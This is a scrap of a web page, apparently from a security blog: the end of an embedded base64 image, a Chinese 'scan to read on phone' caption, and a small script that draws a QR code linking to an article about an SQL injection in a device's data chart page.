J3H4vweQEsHvCpPpb/nOwitAvvCXzUy41BdAh2XX4F7zfkyin9Ymb5OaTfsz8F+nDtKYDkIGi/GX63/7qfPdRgvLd+R0hOvddf1a3refkVvN+QK6f0i5nNQCBPCwTdi9MXIb7cHBzrEN+8aB8R9nMQ3Zz1hRCvrmuZgehysTJ7C5LXg5Grd4Tv5dxP4WYg/SY3/90TmP4pq6ZVq28H8hSUVwvCe27Gq6YWpA6C5mHkMx2Sgyf2LMTrurz2UUu+xVGB9KuaWroQXS5CdAiqV20t+RrvN2R9Gm9wvfwpqya2XrO9mem+ugh5KuRir5ND8vKzvP4e2kPsGci9IGhuhr3+as66WV4dsg/g/veyHm/2tXyGwHNKcH7t9zF7CtQhvczDyM2J5q4ipB8wLQE+fsI2cPVe5mCsh3AI2leEfb37sM3dnyGe0pvgMhCfhjM82zdk6hA0DyP3PvozPMvpF/YepdVSh+wBguodq6YWjDkYea+TV20t+VdwGchXiu7s3zuBzUAgTwGMeLYFSL6ejPU6q9OHsV5dtKcckoct9oy1Hc2py8WZPvNhuxfA+MfnGDz/5tD+a9wMZKm+L15yAj8eCPAxeacM4RD0u9KXi5CcPoR3X/4VtKc1MPY+860z13Hmq3e0Xh3G/ZT+44FUk3v9/07gxwPpU+9b04ft01DZM78y62V+rfVrM5B7QtAchMOIV+vs0xHSr+tnHFIH3D+pP97sa/OG+JR0vLrvXgeZvvX6EB2C6iKMuvWwr5dvbV3Xkncsb73011pdq8P8npXryzp1OaRP1/ULNwMxfONrTmAZCGR6cIxn24TUz3Kw78Oo19NSC6JDsLRa9q9rlxokCyPqn+XNQepn/Ez3PpA+8l4H8YH7M+TxZl/LG/Jm+/rPbud/AAAA//903naXAAAABklEQVQDAA9LdMhMIu9pAAAAAElFTkSuQmCC)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/netmizer-data-echart-terminals-device-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 